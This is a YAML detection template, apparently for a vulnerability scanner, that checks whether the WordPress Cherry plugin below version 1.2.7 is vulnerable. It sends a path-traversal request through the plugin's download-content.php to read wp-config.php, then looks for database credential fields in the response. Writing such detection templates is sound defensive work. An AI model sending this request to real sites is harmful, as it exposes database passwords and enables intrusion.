id: "cherry-lfi"
name: "WordPress Cherry < 1.2.7 - Unauthenticated Arbitrary File Upload and Download"
severity: "high"
description: "WordPress plugin Cherry < 1.2.7 has a vulnerability which enables an attacker to upload files directly to the server. This could result in attacker uploading backdoor shell scripts or downloading the wp-config.php file."
tech:
  - "wordpress"
  - "php"
tags:
  - "wpscan"
  - "wordpress"
  - "wp-plugin"
  - "lfi"
  - "wp"
  - "vuln"
reference: "https://wpscan.com/vulnerability/90034817-dee7-40c9-80a2-1f1cd1d033ee"
spaExclusion: true
request:
  method: "GET"
  path: "/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "DB_NAME"
      - "DB_PASSWORD"
    condition: "and"
  - type: "status"
    status:
      - 200
